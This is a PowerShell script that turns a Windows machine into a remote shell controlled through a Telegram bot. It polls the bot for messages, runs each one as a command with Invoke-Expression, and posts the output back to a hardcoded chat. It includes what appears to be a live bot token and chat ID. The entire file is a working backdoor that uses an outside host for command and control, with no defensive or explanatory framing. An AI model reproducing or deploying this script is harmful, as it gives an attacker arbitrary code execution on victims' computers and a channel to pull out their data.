# Replace with your Bot Token and Chat ID
$BotToken = "8006651815:AAFdb-RBtAvHooLfklSitzk6yjh0ALccSpU"
$ChatID = "1542219670"
$Offset = 0

function Send-TGMessage {
    param ([string]$Message)
    $Url = "https://api.telegram.org/bot$BotToken/sendMessage"
    Invoke-RestMethod -Uri $Url -Method Post -Body @{chat_id = $ChatID; text = $Message}
}

function Get-TGUpdates {
    $Url = "https://api.telegram.org/bot$BotToken/getUpdates?offset=$Offset"
    Invoke-RestMethod -Uri $Url -Method Get
}

function Execute-Command {
    param ([string]$Cmd)
    try { Invoke-Expression $Cmd | Out-String } catch { $_.Exception.Message }
}

Send-TGMessage "Reverse shell started on $env:COMPUTERNAME"

while ($true) {
    $Updates = Get-TGUpdates
    foreach ($Update in $Updates.result) {
        $Offset = $Update.update_id + 1
        $Cmd = $Update.message.text
        if ($Cmd -eq "/stop") { Send-TGMessage "Shell stopped."; break }
        $Result = Execute-Command $Cmd
        Send-TGMessage "Command: $Cmd`nResult:`n$Result"
    }
    Start-Sleep -Seconds 2
}
